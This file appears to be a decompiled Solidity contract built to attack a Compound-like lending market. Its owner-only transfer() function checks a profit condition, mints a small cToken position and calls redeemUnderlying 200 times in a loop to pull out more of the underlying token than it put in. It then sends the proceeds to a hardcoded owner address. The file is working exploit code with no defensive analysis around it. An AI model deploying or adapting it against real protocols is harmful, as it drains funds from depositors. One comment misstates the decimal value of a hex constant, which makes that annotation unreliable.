// SPDX-License-Identifier: MIT
pragma solidity ^0.8.31;

contract AdminContract {
    address private constant OWNER = 0x4bd44ab605d3e88579a1cf5a18c1a805e648f5e8;
    
    // Storage variables
    address private token1;  // stor_1_0_19
    address private token2;  // stor_4_0_19
    address private cToken;  // _approve - likely a cToken (Compound-like token)
    
    // Only owner modifier
    modifier onlyOwner() {
        require(msg.sender == OWNER, "Not authorized");
        _;
    }
    
    // Fallback function
    fallback() external payable {}
    receive() external payable {}
    
    /**
     * @dev Approve function - calls mint on cToken
     * Note: Misleading name - actually calls mint on the cToken
     */
    function approve(address spender, uint256 amount) external onlyOwner {
        require(spender != address(0), "Invalid address");
        // This actually calls mint on the cToken contract
        (bool success, ) = cToken.call(
            abi.encodeWithSignature("mint(uint256)", amount)
        );
        require(success, "Mint call failed");
    }
    
    /**
     * @dev Withdraw all tokens from a specific ERC20 contract
     */
    function withdrawToken(address tokenAddress) external onlyOwner {
        // Get balance of this contract
        (bool success1, bytes memory data) = tokenAddress.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success1, "Balance check failed");
        uint256 balance = abi.decode(data, (uint256));
        
        // Transfer all tokens to owner
        (bool success2, ) = tokenAddress.call(
            abi.encodeWithSignature("transfer(address,uint256)", OWNER, balance)
        );
        require(success2, "Transfer failed");
    }
    
    /**
     * @dev Withdraw all token1 (stored token) to owner
     */
    function withdrawToken1() external onlyOwner {
        // Get balance of this contract
        (bool success1, bytes memory data) = token1.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success1, "Balance check failed");
        uint256 balance = abi.decode(data, (uint256));
        
        // Transfer all tokens to owner
        (bool success2, ) = token1.call(
            abi.encodeWithSignature("transfer(address,uint256)", OWNER, balance)
        );
        require(success2, "Transfer failed");
    }
    
    /**
     * @dev Complex arbitrage/attack function
     * Note: The parameter appears unused in the decompilation
     */
    function transfer(address /*wallet*/) external onlyOwner {
        // Get initial token2 balance
        (bool success1, bytes memory data1) = token2.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success1, "Balance check failed");
        uint256 initialBalance = abi.decode(data1, (uint256));
        
        // Get exchange rate from cToken
        (bool success2, bytes memory data2) = cToken.call(
            abi.encodeWithSignature("exchangeRateStored()")
        );
        require(success2, "Exchange rate call failed");
        uint256 exchangeRate = abi.decode(data2, (uint256));
        
        // Complex calculations (appears to be checking profit conditions)
        uint256 calc1 = safeMul(exchangeRate, 199);
        uint256 calc2 = safeDiv(calc1, 10 ** 20);
        uint256 calc3 = safeMul(calc2, 101);
        uint256 calc4 = safeMul(calc3, 0x7c8683448); // 33,333,333,000 in decimal
        uint256 calc5 = safeDiv(calc4, 10 ** 18);
        
        uint256 gasCost = safeMul(gasleft(), 0x5265c0); // 5,400,000 in decimal
        gasCost = safeMul(gasCost, 3000);
        gasCost = safeDiv(gasCost, 10 ** 16);
        
        // Require that the potential profit exceeds gas cost
        require(calc5 > gasCost, "Insufficient profit margin");
        
        // Check cToken balance
        (bool success3, bytes memory data3) = cToken.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success3, "cToken balance check failed");
        uint256 cTokenBalance = abi.decode(data3, (uint256));
        
        // If cToken balance is less than 100, mint more
        if (cTokenBalance < 100) {
            uint256 mintAmount = safeMul(calc2, 101);
            (bool mintSuccess, ) = cToken.call(
                abi.encodeWithSignature("mint(uint256)", mintAmount)
            );
            require(mintSuccess, "Mint failed");
        }
        
        // Redeem underlying tokens 200 times
        for (uint256 i = 0; i < 200; i++) {
            (bool redeemSuccess, ) = cToken.call(
                abi.encodeWithSignature("redeemUnderlying(uint256)", calc2)
            );
            require(redeemSuccess, "Redeem failed");
        }
        
        // Check final token2 balance
        (bool success4, bytes memory data4) = token2.call(
            abi.encodeWithSignature("balanceOf(address)", address(this))
        );
        require(success4, "Final balance check failed");
        uint256 finalBalance = abi.decode(data4, (uint256));
        
        // Require that balance increased
        require(finalBalance > initialBalance, "No profit made");
    }
    
    /**
     * @dev Safe multiplication with overflow check
     */
    function safeMul(uint256 a, uint256 b) private pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "Multiplication overflow");
        return c;
    }
    
    /**
     * @dev Safe division
     */
    function safeDiv(uint256 a, uint256 b) private pure returns (uint256) {
        require(b > 0, "Division by zero");
        return a / b;
    }
    
    /**
     * @dev Refund all ETH to owner
     */
    function refund() external onlyOwner {
        (bool success, ) = OWNER.call{value: address(this).balance}("");
        require(success, "ETH transfer failed");
    }
}